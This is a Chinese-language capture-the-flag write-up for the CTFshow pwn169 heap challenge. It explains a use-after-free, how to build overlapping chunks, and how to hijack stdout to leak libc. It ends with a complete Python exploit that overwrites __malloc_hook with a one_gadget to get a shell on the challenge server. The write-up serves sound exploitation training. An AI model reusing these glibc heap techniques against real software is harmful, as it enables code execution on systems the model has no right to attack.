---
title: CTFshow pwn169
tags:
    - pwn
    - IO_FILE
categories:
    - 做题笔记
cover: /img/治不开心药.png
---
# CTFshow pwn169(重叠|劫持stdout)
## 前言

​	堆块重叠，真的是绕不开的一个手法。只要有uaf漏洞几乎都需要重叠来配合。这一道是比较简单的一道题，自己拖拖拉拉，又捱到了22点才完成这到题。对stdout已经完全不陌生了，感觉像老朋友了。这到题也算又扩展（应该算复习）了堆块重叠的一种方法。
​	如果说uaf漏洞是在借尸还魂，那么我们重叠的手法就是**“瞒天过海”**

## ida分析
### main函数分析
![image-20250611230847917](https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/image-20250611230847917.png)
1.一个menu，三个功能
2.没有show，应该是需要劫持stdout来泄露libc的

### create函数分析
![image-20250611230931371](https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/image-20250611230931371.png)
1.限制了大小，大小合适才能malloc
2.96是0x60，加上chunk头，最大是0x70，这个大小还不够进入unsorted bin

### delete函数分析
![](https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/image-20250611231214680.png)
1.明显的uaf漏洞

### rename函数分析
![image-20250611231354251](https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/image-20250611231354251.png)
1.没有漏洞只能正常的编辑堆块内容

## 思路分析
1.在保护机制全开的情况下，没有show功能的时候，第一想到的就是劫持stdout。常见做法就是打overlap，让堆块既在fastbins又在unsorted bin中。因为unsorted bin中的堆块会被写入main_arena相关地址，借此覆盖低位就可以劫持的stdout。但是这题限制了堆块大小，我们该如何把堆块放入unsorted bin中呢？
2.利用堆块的重叠，去构造一个大小可以进入unsorted bin中的堆块。其实堆块重叠的本质是修改堆块的size，使其修改后的大小可以包含相邻的其他堆块(刚好重叠)。在这道题中我们没有溢出漏洞去修改size，所以不能直接完成这个利用。但是我们可以在堆块内，构造一个fake chunk 的chunk 头 ，然后通过fastbins 的fd 链表，覆盖低地址，把fake chunk 链入链表中。然后分配出这个堆块，因为堆块的重叠，物理地址相邻的下一个堆块的chunk 头就在我们可编辑的范围内了。然后就可以修改其size，把其放入unsorted bin中。同时，为了可以分配到stdout，我们需要提前把这个unsorted bin的堆块放入fastbins 中，通过fastbin dup 去劫持。
3.泄露出libc后呢，就是劫持malloc_hook和realloc。也是很常规的操作了。


## exp
```python 
from esy import *
context.log_level="debug"
context.terminal=["tmux","splitw","-h","-l","66%"]

libc=ELF("/home/tsq/glibc-all-in-one/libs/2.23_0ubuntu10_amd64/libc.so.6")

def add(size,idx,content):
    io.sendlineafter("choice >>","1")
    io.sendlineafter("wlecome input your size of skills: ",str(size))
    io.sendlineafter("input index: ",str(idx))
    io.sendafter("input your name:\n",content)

def free(idx):
    io.sendlineafter("choice >>","2")
    io.sendlineafter("input idx :",str(idx))

def edit(idx,content):
    io.sendlineafter("choice >>","3")
    io.sendlineafter("input idx: ",str(idx))
    io.sendafter("new content:",content)


def exploit():
    fake=p64(0)+p64(0x71)
    add(0x60,0,b'\x63'*0x10+fake) # 0
    add(0x60,1,b'\x61'*4) # 1 .....
    add(0x10,2,b'\x62'*4) # 2
    add(0x60,3,b'\x64'*4) # 3
    add(0x20,4,b'\x64'*4) # 4
    free(1)
    free(0)

    edit(0,b'\x20')
    add(0x60,0,b'a')   # 0
    add(0x60,5,b'f')  # 5
    free(1)

    edit(5,p64(0)*9+p64(0x91))
    free(1)
    edit(5,p64(0)*9+p64(0x71))
    edit(1,b'\xdd\x55')
    payload=b'\0'*0x33+p64(0xfbad1887)+p64(0)*3+b'\0'
    add(0x60,6,b'a')
    add(0x60,7,payload)

    # leak - libc
    io.recv(0x40)
    stdout=u64(io.recv(6).ljust(8,b'\x00'))+0x20
    libcbase=stdout-libc.sym['_IO_2_1_stdout_']
    malloc_hook=libcbase+libc.sym['__malloc_hook']
    realloc=libcbase+libc.sym['realloc']
    one_gadget=[0x4526a,0xf02a4]
    logvalue("stdout",hex(stdout))
    # 
    free(1)
    edit(1,p64(malloc_hook-0x23))
    payload=0xb*b"\x00"+p64(one_gadget[0]+libcbase)+p64(realloc+4)
    add(0x60,1,b'a')
    add(0x60,8,payload)
    io.sendlineafter("choice >>","1")
    io.sendlineafter("wlecome input your size of skills: ",str(0x20))
    io.sendlineafter("input index: ",str(1))

while True:
    try:
        io,elf=loadfile("pwn","pwn.challenge.ctf.show",28175)
        exploit()
        io.interactive()
    except:
        io.close()
```